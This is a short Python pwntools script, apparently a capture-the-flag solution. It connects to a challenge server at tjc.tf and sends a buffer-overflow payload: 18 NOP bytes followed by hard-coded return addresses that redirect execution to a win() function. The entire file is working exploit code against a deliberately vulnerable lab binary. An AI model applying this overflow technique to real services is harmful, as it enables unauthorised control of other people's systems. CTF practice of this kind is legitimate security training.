from pwn import *

context.clear(arch="amd64")
# p = process("./out")
p = remote("tjc.tf", 31080)

p.clean(timeout=1)

payload = b"\x90" * 18

payload += p64(0x0040128a) # pop and jump to main's ret
payload += p64(0x004011b3) # pop and jump to win()

p.sendline(payload)
print(p.clean(timeout=1).decode())
